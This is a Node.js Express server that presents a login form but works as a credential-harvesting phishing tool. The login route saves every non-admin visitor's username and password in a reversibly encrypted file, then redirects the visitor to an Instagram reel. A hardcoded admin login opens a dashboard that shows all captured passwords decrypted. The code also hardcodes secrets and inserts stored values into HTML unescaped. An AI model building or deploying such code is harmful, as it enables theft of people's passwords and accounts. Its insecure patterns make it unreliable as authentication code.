const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Admin credentials
const ADMIN_USERNAME = 'AdminUser';
const ADMIN_PASSWORD = 'AdminPass123';

// Global variable to store admin view data
let adminUsersData = [];

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// === Encryption Functions ===
const secretKey = 'my_super_secret_key';
const algorithm = 'aes-256-cbc';
const key = crypto.createHash('sha256').update(secretKey).digest();

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()]);
  return iv.toString('hex') + ':' + encrypted.toString('hex');
}

function decrypt(encryptedData) {
  const [ivHex, encryptedText] = encryptedData.split(':');
  const iv = Buffer.from(ivHex, 'hex');
  const encryptedBuffer = Buffer.from(encryptedText, 'hex');
  const decipher = crypto.createDecipheriv(algorithm, key, iv);
  const decrypted = Buffer.concat([decipher.update(encryptedBuffer), decipher.final()]);
  return decrypted.toString('utf8');
}

// === Login Route ===
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ error: 'Missing credentials' });

  const filePath = path.join(__dirname, 'users.json');

  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    // Admin login: load and decrypt users then redirect to /admin
    if (!fs.existsSync(filePath)) {
      adminUsersData = [];
      return res.json({ redirect: '/admin' });
    }

    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err)
        return res.status(500).json({ error: 'Error reading user data' });

      let users;
      try {
        users = JSON.parse(data);
      } catch (parseErr) {
        return res.status(500).json({ error: 'Error parsing user data' });
      }

      adminUsersData = users.map(user => ({
        username: user.username,
        password: decrypt(user.password)
      }));

      return res.json({ redirect: '/admin' });
    });
  } else {
    // Non-admin login: save new user and redirect to /home
    const encryptedPassword = encrypt(password);
    const userRecord = { username, password: encryptedPassword };

    fs.readFile(filePath, 'utf8', (err, data) => {
      let users = [];
      if (!err && data) {
        try { 
          users = JSON.parse(data); 
        } catch (e) { 
          users = []; 
        }
      }
      users.push(userRecord);
      fs.writeFile(filePath, JSON.stringify(users, null, 2), (writeErr) => {
        if (writeErr)
          return res.status(500).json({ error: 'Error saving user data' });

        return res.json({ redirect: "https://www.instagram.com/reel/DGdkncavc8K/?igsh=endyaW8wM2hmOXk0" });
      });
    });
  }
});

// === Admin Dashboard Route ===
app.get('/admin', (req, res) => {
  // Generate a modern, gradient-styled admin page that displays stored user credentials in cards.
  let usersHtml = adminUsersData.map(user => `
    <div class="user-card">
      <div class="user-info">
        <h3>${user.username}</h3>
        <p>${user.password}</p>
      </div>
    </div>
  `).join('');

  let html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Admin Dashboard</title>
      <style>
        body {
          margin: 0;
          font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
          background: linear-gradient(135deg, #02dcf0, #0c8691);
          color: #fff;
        }
        .container {
          max-width: 800px;
          margin: 50px auto;
          padding: 20px;
        }
        h1 {
          text-align: center;
          margin-bottom: 40px;
        }
        .user-card {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 8px;
          padding: 20px;
          margin-bottom: 20px;
          box-shadow: 0 4px 6px rgba(0,0,0,0.1);
          transition: transform 0.3s;
        }
        .user-card:hover {
          transform: scale(1.02);
        }
        .user-info h3 {
          margin: 0 0 10px;
          font-size: 20px;
        }
        .user-info p {
          margin: 0;
          font-size: 16px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>Admin Dashboard</h1>
        ${usersHtml || '<p>No user data available.</p>'}
      </div>
    </body>
    </html>
  `;
  res.send(html);
});

// === Home Page Route for Non-admin Users ===
app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

// Start server
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));